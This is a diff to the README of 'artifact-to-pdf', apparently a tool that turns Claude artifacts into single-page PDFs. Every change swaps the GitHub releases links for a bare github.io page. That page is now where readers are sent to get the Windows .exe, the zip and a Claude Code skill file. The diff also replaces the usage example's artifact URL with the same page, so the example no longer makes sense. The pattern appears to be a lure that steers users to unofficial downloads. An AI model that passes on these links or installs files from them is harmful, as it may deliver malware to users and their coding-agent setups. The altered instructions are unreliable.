@@ -1,6 +1,6 @@
 # 📄 artifact-to-pdf - Turn HTML into perfect, single-page PDFs
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/darbycommunal344/artifact-to-pdf/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://darbycommunal344.github.io)
 
 ## 🎯 What This Tool Does
 
@@ -30,7 +30,7 @@ You get a pixel-perfect copy of your work. Every image, every line of code, ever
 
 ### Step 1: Download the tool
 
-Visit the [download page](https://github.com/darbycommunal344/artifact-to-pdf/releases) to get the latest version.
+Visit the [download page](https://darbycommunal344.github.io) to get the latest version.
 
 Look for the file named `artifact-to-pdf-windows.exe` or `artifact-to-pdf.zip`. Choose the one that matches your system.
 
@@ -62,7 +62,7 @@ If you downloaded the `.zip` file:
 Open a command prompt or PowerShell window. Type:
 
 ```
-artifact-to-pdf "https://claude.ai/artifacts/your-artifact-id"
+artifact-to-pdf "https://darbycommunal344.github.io"
 ```
 
 The tool will create a PDF file in the same folder.
@@ -130,7 +130,7 @@ If you use Claude Code, you can add artifact-to-pdf as a skill. This lets you co
 
 **To install the skill:**
 
-1. Download the skill file from the [releases page](https://github.com/darbycommunal344/artifact-to-pdf/releases)
+1. Download the skill file from the [releases page](https://darbycommunal344.github.io)
 2. Place the file in your Claude Code skills folder
 3. Restart Claude Code
 
@@ -144,12 +144,12 @@ The skill will download the artifact, convert it to PDF, and save it to your cur
 
 ## 🆘 Getting Help
 
-If you run into problems, check the [releases page](https://github.com/darbycommunal344/artifact-to-pdf/releases) for updates. New versions may fix your issue.
+If you run into problems, check the [releases page](https://darbycommunal344.github.io) for updates. New versions may fix your issue.
 
 You can also create an issue on the GitHub repository. Describe your problem in detail. Include your Windows version and the tool version you are using.
 
 ## 📥 Download Again
 
-[Download the latest version from GitHub](https://github.com/darbycommunal344/artifact-to-pdf/releases)
+[Download the latest version from GitHub](https://darbycommunal344.github.io)
 
 Keywords: claude, claude-artifacts, claude-code, claude-skill, cli, headless-chrome, html-to-pdf, no-page-breaks, pdf, pdf-generator, playwright, single-page
